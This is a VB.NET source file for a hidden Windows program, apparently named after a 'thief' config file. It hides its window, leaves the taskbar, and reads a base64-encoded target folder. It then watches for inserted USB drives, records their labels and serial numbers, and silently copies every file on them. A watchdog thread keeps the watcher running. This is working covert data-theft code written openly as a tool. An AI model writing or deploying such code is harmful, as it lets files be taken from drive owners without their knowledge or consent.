Imports Scripting

Public Class frmMain
	Dim _TempMode As Boolean = False
	Dim USBWatcher As Watcher
	Dim CopyToDir As String = ""
	Dim DoNotCopyList As New List(Of String)
	Public LogList As New List(Of Log)

	Private Sub CloneUSB(Volume As String, DriveInfo As IO.DriveInfo)
		Try
			Dim t As New Threading.Thread(
			Sub()
				Try
					Dim USBCloneDir As String = (CopyToDir & ToUnixTime(Now.ToString, 8) & "_" & New Random().Next(0, 1000).ToString)
					Dim w = My.Computer.FileSystem.OpenTextFileWriter(USBCloneDir & ".txt", False)
					w.WriteLine(DriveInfo.VolumeLabel)
					w.Flush()
					w.Close()
					If Not USBCloneDir.EndsWith("\") Then
						USBCloneDir += "\"
					End If
					Dim FileList As New Dictionary(Of String, Long)
					Dim DirectoryList As New List(Of String)
					' 创建文件列表
					Dim l1 As New Log
					l1.message = "USBCloneDir = " & USBCloneDir
					l1.type = "Var"
					l1.time = Now.ToString
					LogList.Add(l1)
					l1.message = "Listing Files"
					l1.type = "info"
					l1.time = Now.ToString
					LogList.Add(l1)
					' 遍历根目录
					l1.message = "Searching Root Directory"
					l1.type = "info"
					l1.time = Now.ToString
					LogList.Add(l1)
					For Each file In My.Computer.FileSystem.GetFiles(Volume)
						If InStr(file, ".") = 0 Then
							Continue For
						End If
						' 检查不复制扩展名
						For Each DoNotCopy In DoNotCopyList
							If file.Split(".")(file.Split(".").Length - 1) = DoNotCopy Then
								Exit For
								Continue For
							End If
						Next
						' 添加文件到列表
						Try
							Dim flength = My.Computer.FileSystem.GetFileInfo(file).Length
							FileList.Add(file, flength)
						Catch
							l1.message = "Searching Root Directory"
							l1.type = "info"
							l1.time = Now.ToString
							LogList.Add(l1)
						End Try
					Next
					' 遍历所有子目录
					l1.message = "Searching Child Directories"
					l1.type = "info"
					l1.time = Now.ToString
					LogList.Add(l1)
					GetFileAndDir(Volume, FileList, DirectoryList)
					' 复制文件
					' 检查文件夹是否存在
					If Not My.Computer.FileSystem.DirectoryExists(CopyToDir) Then
						'does not exist
						Try
							'try to recover
							My.Computer.FileSystem.CreateDirectory(CopyToDir)
						Catch ex As Exception
							' if fail, quit app
							Application.Exit()
						End Try
					Else
						'directory exists, create USB Dir
						Try
							My.Computer.FileSystem.CreateDirectory(USBCloneDir)
						Catch ex As Exception
							WriteErrLog(ex, "Creating Dir")
						End Try
					End If

					'创建文件目录结构
					l1.message = "Creating Directory Strcuture"
					l1.type = "info"
					l1.time = Now.ToString
					LogList.Add(l1)
					For Each Directory In DirectoryList
						Try
							Dim d = Directory
							If Not d.EndsWith("\") Then
								d += "\"
							End If
							Dim TestDir As String = ""
							Dim SplitedDir() = Split(Directory, "\")
							For i = 0 To SplitedDir.Length - 1
								TestDir = ""
								For j = 0 To i
									TestDir += SplitedDir(j) + "\"
								Next
								TestDir = USBCloneDir & GetRelativePath(TestDir)
								If Not My.Computer.FileSystem.DirectoryExists(TestDir) Then
									My.Computer.FileSystem.CreateDirectory(TestDir)
									l1.message = "Create Directory: " & TestDir
									l1.type = "info"
									l1.time = Now.ToString
									LogList.Add(l1)
								End If
							Next
						Catch ex As Exception
							WriteErrLog(ex, "Creating Dir Structure")
							Exit Sub
						End Try
					Next

					'克隆U盘
					For i = 0 To FileList.Count - 1
						Dim f As New KeyValuePair(Of String, Long)
						'从最小文件开始复制
						Dim min As Long = 0
						For Each file In FileList
							If min = 0 Then
								min = file.Value
								f = file
							ElseIf file.Value < min Then
								min = file.Value
								f = file
							End If
						Next
						Try
							l1.message = "Copying File: " & Dir(f.Key) & "   Size" & f.Value
							l1.type = "info"
							l1.time = Now.ToString
							LogList.Add(l1)
							My.Computer.FileSystem.CopyFile(f.Key, USBCloneDir & GetRelativePath(f.Key))
							FileList.Remove(f.Key)
						Catch ex As Exception
							'if failed to copy, skip the file
							FileList.Remove(f.Key)
							If Not My.Computer.FileSystem.DirectoryExists(Volume) Then
								'Device Removed
								l1.message = "Surprise Unplug at " & Volume
								l1.type = "info"
								l1.time = Now.ToString
								LogList.Add(l1)
								Exit Sub
							End If
						End Try
					Next
					Dim l As New Log
					l.message = "Done!"
					l.type = "info"
					l.time = Now.ToString
					LogList.Add(l)
				Catch ex As Exception
					WriteErrLog(ex, "Cloning USB")
					Dim l As New Log
					l.type = "Variables"
					l.time = Now.ToString
					l.message = "USBCloneDir = "
					LogList.Add(l)
					Exit Sub
				End Try

			End Sub)
			t.IsBackground = True
			t.Start()
		Catch ex As Exception
			WriteErrLog(ex, "in Sub Clone")
			Exit Sub
		End Try
	End Sub

	Private Sub frmMain_Load(sender As Object, e As EventArgs) Handles Me.Load
		If My.Application.CommandLineArgs.Count <> 0 Then
			If My.Application.CommandLineArgs(0) = "--Temp" Then

			End If
		End If
		Try
			Dim l As New Log
			l.message = "Program Initiaing"
			l.type = "info"
			l.time = Now.ToString
			LogList.Add(l)
			Hide()
			Me.ShowInTaskbar = False
			USBWatcher = New Watcher(Me)
			Dim t As New Threading.Thread(AddressOf WriteLog)
			t.IsBackground = True
			t.Start()
		Catch ex As Exception
			Application.Exit()
		End Try
		Try
			Dim l As New Log
			l.message = "Reading Config"
			l.type = "info"
			l.time = Now.ToString
			LogList.Add(l)
			Dim config = My.Computer.FileSystem.OpenTextFileReader("D:\config\thief.ini", System.Text.Encoding.UTF8)
			Dim d = config.ReadLine()
			d = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(d))
			config.Close()
			l.message = "OK"
			l.type = "info"
			l.time = Now.ToString
			LogList.Add(l)
			CopyToDir = d
			If Not CopyToDir.EndsWith("\") Then
				CopyToDir += "\"
			End If
			l.message = "Starting Watcher"
			l.type = "info"
			l.time = Now.ToString
			LogList.Add(l)
			AddHandler USBWatcher.DeviceArrived, AddressOf Watcher_DeviceArrived
			USBWatcher.StartWatcher()
			l.message = "OK"
			l.type = "info"
			l.time = Now.ToString
			LogList.Add(l)
			l.message = "Starting Watcher Checker"
			l.type = "info"
			l.time = Now.ToString
			LogList.Add(l)
			Dim th As New Threading.Thread(Sub()
											   Do
												   If Not USBWatcher.IsRunning Then
													   Try
														   USBWatcher.StartWatcher()
													   Catch ex As Exception
														   WriteErrLog(ex, "Restarting Watcher")
													   End Try
												   End If
												   Threading.Thread.Sleep(1000)
											   Loop
										   End Sub)
			th.IsBackground = True
			th.Start()
			l.message = "OK"
			l.type = "info"
			l.time = Now.ToString
			LogList.Add(l)
			l.message = "Program Initiated"
			l.type = "info"
			l.time = Now.ToString
			LogList.Add(l)
		Catch ex As Exception
			WriteErrLog(ex, "Starting up")
			If My.Computer.FileSystem.DirectoryExists("D:\Config\") Then
				Dim f = My.Computer.FileSystem.OpenTextFileWriter("D:\Config\cLog.log", True)
				f.WriteLine(String.Format("[{0}] {1}    {2}", LogList(0).time, "ERROR".ToUpper, ex.Message))
				f.Flush()
				f.Close()
			End If

			Application.Exit()
		End Try

	End Sub

	Private Sub Watcher_DeviceArrived(Letter As String, DriveInfo As IO.DriveInfo)
		Try
			If DriveInfo.IsReady Then
				If DriveInfo.DriveFormat.ToLower = "fat32" Or DriveInfo.DriveFormat.ToLower = "ntfs" Or DriveInfo.DriveFormat.ToLower = "exfat" Then
					Dim l As New Log
					l.message = "New Device Detected at " & Letter & "  VolumeLabel: " & DriveInfo.VolumeLabel & "SN:  " & GetSN(Letter)
					l.time = Now.ToString
					l.type = "INFO"
					LogList.Add(l)
					Try
						Invoke(Sub()
								   CloneUSB(Letter, DriveInfo)
							   End Sub)
					Catch ex As Exception
						WriteErrLog(ex, "Cloning USB")
					End Try
				End If
			End If
		Catch ex As Exception
			WriteErrLog(ex, "Device Arrive")
		End Try
	End Sub

	Private Function GetSN(DriveLetter As String) As String
		DriveLetter = Mid(DriveLetter, 2)
		Dim driveNames As New List(Of String)
		For Each drive As IO.DriveInfo In My.Computer.FileSystem.Drives
			Try
				Dim fso As Scripting.FileSystemObject
				Dim oDrive As Drive

				fso = CreateObject("Scripting.FileSystemObject")

				oDrive = fso.GetDrive(drive.Name)

				If Mid(oDrive.DriveLetter, 2) = DriveLetter Then
					Return oDrive.SerialNumber
					Exit Function
				End If
			Catch ex As Exception
				WriteErrLog(ex, "Getting Drive SN")
			End Try
		Next
		Return ""
	End Function

	Private Function ToUnixTime(strTime, intTimeZone)
		ToUnixTime = DateAdd("h", -intTimeZone, strTime)
		ToUnixTime = DateDiff("s", "1970-1-1 0:0:0", ToUnixTime)
		Return ToUnixTime
	End Function

	Private Function GetRelativePath(path As String) As String
		Dim r = path
		r = Mid(r, 2)
		r = r.Replace(":\", "")
		Return r
	End Function

	Public Structure Log
		Public time As String
		Public type As String
		Public message As String
		Public position As String
	End Structure

	Private Sub WriteLog()
		Do
			If LogList.Count <> 0 Then
				Try
					Dim f = My.Computer.FileSystem.OpenTextFileWriter("D:\Config\Log.log", True)
					f.AutoFlush = True
					For i = 0 To LogList.Count - 1
						If LogList(0).position = "" Then
							f.WriteLine(String.Format("[{0}] {1}    {2}", LogList(0).time, LogList(0).type.ToUpper, LogList(0).message))
							Console.WriteLine(String.Format("[{0}] {1}    {2}", LogList(0).time, LogList(0).type.ToUpper, LogList(0).message))
							LogList.RemoveAt(0)
						Else
							f.WriteLine(String.Format("[{0}] {1}    {2}   AT   {3}", LogList(0).time, LogList(0).type.ToUpper, LogList(0).message, LogList(0).position))
							Console.WriteLine(String.Format("[{0}] {1}    {2}   AT   {3}", LogList(0).time, LogList(0).type.ToUpper, LogList(0).message, LogList(0).position))
							LogList.RemoveAt(0)
						End If
					Next
					f.Close()
				Catch ex As Exception
				WriteErrLog(ex, "Writelog")
				End Try
			End If
			Threading.Thread.Sleep(100)
		Loop
	End Sub

	Public Sub WriteErrLog(ex As Exception, position As String)
		Dim l As New Log
		l.message = ex.Message
		l.time = Now.ToString
		l.type = "error"
		l.position = position
		LogList.Add(l)
	End Sub

	Private Sub GetFileAndDir(Path As String, ByRef FileList As Dictionary(Of String, Long), ByRef DirectoryList As List(Of String))
		' 遍历子文件夹
		For Each Directory In My.Computer.FileSystem.GetDirectories(Path)
			For Each file In My.Computer.FileSystem.GetFiles(Directory)
				If InStr(file, ".") = 0 Then
					Continue For
				End If
				' 检查不复制扩展名
				For Each DoNotCopy In DoNotCopyList
					If file.Split(".")(file.Split(".").Length - 1) = DoNotCopy Then
						Continue For
					End If
				Next
				' 添加文件到列表
				FileList.Add(file, My.Computer.FileSystem.GetFileInfo(file).Length)
			Next
			DirectoryList.Add(Directory)
			GetFileAndDir(Directory, FileList, DirectoryList)
		Next

	End Sub

End Class
